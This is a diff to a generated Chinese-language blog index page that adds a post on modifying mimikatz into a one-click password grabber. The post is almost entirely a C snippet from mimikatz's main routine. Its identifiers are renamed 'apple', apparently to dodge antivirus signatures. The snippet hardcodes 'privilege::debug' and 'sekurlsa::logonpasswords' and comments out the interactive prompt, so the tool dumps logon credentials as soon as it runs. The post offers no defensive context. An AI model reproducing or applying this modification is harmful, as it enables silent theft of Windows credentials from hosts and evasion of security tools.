@@ -197,7 +197,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">1</span>
+          <span class="site-state-item-count">2</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -210,7 +210,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-count">2</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -239,6 +239,70 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/undefined/4cda64e7/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="听桥">
+      <meta itemprop="description" content="谁也不是">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="TingQiao's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/undefined/4cda64e7/" class="post-title-link" itemprop="url">修改mimikatz为一键抓取密码</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2020-11-27 23:25:47 / 修改时间：23:27:00" itemprop="dateCreated datePublished" datetime="2020-11-27T23:25:47+08:00">2020-11-27</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="修改mimikatz为一键抓取密码"><a href="#修改mimikatz为一键抓取密码" class="headerlink" title="修改mimikatz为一键抓取密码"></a>修改mimikatz为一键抓取密码</h1><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#<span class="keyword">if</span> !defined(_POWERKATZ)</span><br><span class="line">	size_t <span class="built_in">len</span>;</span><br><span class="line">	wchar_t <span class="built_in">input</span>[<span class="number">0xffff</span>];</span><br><span class="line">#endif</span><br><span class="line">	apple_begin();</span><br><span class="line">	apple_dispatchCommand(L<span class="string">&quot;log&quot;</span>);</span><br><span class="line">	apple_dispatchCommand(L<span class="string">&quot;privilege::debug&quot;</span>);</span><br><span class="line">	apple_dispatchCommand(L<span class="string">&quot;sekurlsa::logonpasswords&quot;</span>);</span><br><span class="line">	/*<span class="keyword">for</span>(i = APPLE_AUTO_COMMAND_START ; (i &lt; argc) &amp;&amp; (<span class="built_in">status</span> != STATUS_PROCESS_IS_TERMINATING) &amp;&amp; (<span class="built_in">status</span> != STATUS_THREAD_IS_TERMINATING) ; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		kprintf(L<span class="string">&quot;\n&quot;</span> APPLE L<span class="string">&quot;(&quot;</span> APPLE_AUTO_COMMAND_STRING L<span class="string">&quot;) # %s\n&quot;</span>, argv[i]);</span><br><span class="line">		<span class="built_in">status</span> = apple_dispatchCommand(argv[i]);</span><br><span class="line">	&#125;</span><br><span class="line">#<span class="keyword">if</span> !defined(_POWERKATZ)</span><br><span class="line">	<span class="keyword">while</span> ((<span class="built_in">status</span> != STATUS_PROCESS_IS_TERMINATING) &amp;&amp; (<span class="built_in">status</span> != STATUS_THREAD_IS_TERMINATING))</span><br><span class="line">	&#123;</span><br><span class="line">		kprintf(L<span class="string">&quot;\n&quot;</span> APPLE L<span class="string">&quot; # &quot;</span>); fflush(<span class="built_in">stdin</span>);</span><br><span class="line">		<span class="keyword">if</span>(fgetws(<span class="built_in">input</span>, ARRAYSIZE(<span class="built_in">input</span>), <span class="built_in">stdin</span>) &amp;&amp; (<span class="built_in">len</span> = wcslen(<span class="built_in">input</span>)) &amp;&amp; (<span class="built_in">input</span>[<span class="number">0</span>] != L<span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="built_in">input</span>[<span class="built_in">len</span> - <span class="number">1</span>] == L<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">				<span class="built_in">input</span>[<span class="built_in">len</span> - <span class="number">1</span>] = L<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">			kprintf_inputline(L<span class="string">&quot;%s\n&quot;</span>, <span class="built_in">input</span>);</span><br><span class="line">			<span class="built_in">status</span> = apple_dispatchCommand(<span class="built_in">input</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">#endif*/</span><br><span class="line">	apple_end(<span class="built_in">status</span>);</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
